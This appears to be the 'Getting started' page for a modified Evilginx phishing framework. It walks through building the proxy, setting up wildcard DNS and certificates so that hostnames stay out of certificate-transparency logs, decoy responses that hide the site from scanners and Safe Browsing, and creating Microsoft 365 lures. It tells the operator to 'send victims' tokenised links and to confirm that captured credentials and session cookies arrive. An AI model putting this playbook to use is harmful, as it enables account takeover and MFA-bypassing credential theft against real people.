---
layout: default
title: Getting started
---

# Getting started

From a clean Ubuntu VPS to a working node in 5 steps. Placeholders: `<BASE>.<ZONE>`
(your base domain), `<VPS_IP>` (the node), `<NODE>` (`user@<VPS_IP>`).

> 🔒 Real hostnames, IPs and lure URLs stay in internal docs — never in this repo.

---

## Step 1 — Build

```bash
git clone https://github.com/dn9uy3n/fake-evilginx-pro.git
cd fake-evilginx-pro/src && go build -o ../evilginx2 .
```

## Step 2 — DNS (Cloudflare)

Create two records, both **DNS-only** (grey cloud — the CF proxy breaks MITM TLS):

| Record | Type | Content |
|---|---|---|
| `<BASE>.<ZONE>` | A | `<VPS_IP>` |
| `*.<BASE>.<ZONE>` | A | `<VPS_IP>` |

Both are required: a wildcard `*.base` does **not** match `base` itself.
Verify both resolve before continuing (negative answers cache for up to 30 min).

## Step 3 — Wildcard certificate (DNS-01)

```bash
cd deploy
ZONE=<ZONE> VPS_IP=<VPS_IP> ./wildcard-cert-setup.sh
```

Issues `*.<BASE>.<ZONE>` via Let's Encrypt DNS-01, installs it on the node, turns
autocert off (per-host certs would leak hostnames into CT logs) and sets up renewal.
Needs a Cloudflare API token with `Zone.DNS Edit` for the zone.

## Step 4 — Deploy + start

```bash
deploy/deploy.sh <NODE>
```

This installs two services:

| Service | Role |
|---|---|
| `evilginx2` | reverse proxy `:443` + hidden mTLS API `:9443` |
| `bgrelay` | Google real-browser relay `:9445` (loopback) — see [google-relay](google-relay) |

Flags that matter (in `deploy/templates/evilginx2.service.tpl`):

```
-botguard -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32
```

- `-botguard` serves a benign decoy to non-browser clients (curl, scanners). **A
  141-byte "It works!" response means it's working — not a fault.**
- Never add `-jsobf ultra` (breaks Microsoft login JS) or `-debug` in production
  (leaks plaintext passwords to the journal).

Campaign phishlets go in `<INSTALL_DIR>/phishlets/` on the node — they are
gitignored by design and never ship with the repo.

## Step 5 — First lure

From your workstation (client certs were generated on the node in `~/.evilginx/api/`;
copy them to `tools/api-certs-vps/` and edit `tools/my-servers.json` — see
`servers.example.json` for the format):

```bash
cd tools && python egconsole.py
```

```text
eg> phishlets              # verify your phishlet is enabled
eg> enable ms365           # hot-enable if needed (no restart)
eg> lure-create ms365 https://www.office.com
eg> lureurl ms365 1        # build the URL
```

Send victims `https://<host>/<path>?t=<token>` — read the token from `lures` and
append it yourself (it's a campaign secret). Requests without the token get a
benign redirect; Safe Browsing never sees a login page to classify.

## Verify before the campaign

- [ ] Bare + wildcard hosts resolve from an external resolver
- [ ] curl (plain) → 141-byte decoy = botguard alive
- [ ] Trusted-loopback render shows the real login flow:

```bash
ssh <NODE> 'curl -sk -A "<browser UA>" -L -c /tmp/cj \
  --resolve <host>:443:127.0.0.1 "https://<host>/<path>?t=<token>" -o /dev/null -w "%{http_code} %{size_download}\n"'
```

- [ ] Test account end-to-end: credentials + cookies land in `sessions`
- [ ] Safe Browsing check on a **burner** domain, never the campaign one

## Next

- [Operations guide](operations) — day-2 workflows, the full egconsole reference
- [Google relay](google-relay) — extra setup for the Google phishlet
- [Architecture](architecture) — how it all fits together
